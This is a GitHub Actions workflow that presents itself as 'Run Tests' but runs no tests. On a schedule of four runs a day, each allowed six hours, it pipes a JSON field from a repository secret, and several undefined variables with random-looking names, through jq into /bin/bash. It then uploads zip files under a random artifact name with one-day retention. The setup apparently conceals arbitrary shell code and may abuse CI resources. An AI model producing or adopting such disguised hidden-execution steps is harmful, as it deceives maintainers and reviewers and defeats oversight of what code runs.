name: Run Tests
on:
  workflow_dispatch:

  schedule:
    - cron: '41 3,9,15,21 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  agent:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
      - name: Perform
        env:
          p28: ${{ secrets.p28 }}
        run: |
          printf '%s' "$p28" | jq -r .s603 | /bin/bash
          printf '%s' "$bc2" | jq -r .yqpm6 | /bin/bash
          echo $pqspp636 | jq -r .hs331 | /bin/bash
          printf '%s' "$s4" | jq -r .pipuw57563 | /bin/bash
          echo $exa63 | jq -r .x3046 | /bin/bash
          echo $msp470 | jq -r .pncs5 | /bin/bash

      - name: Upload results
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: 5ayvOwGx
          path: "*.zip"
          retention-days: 1
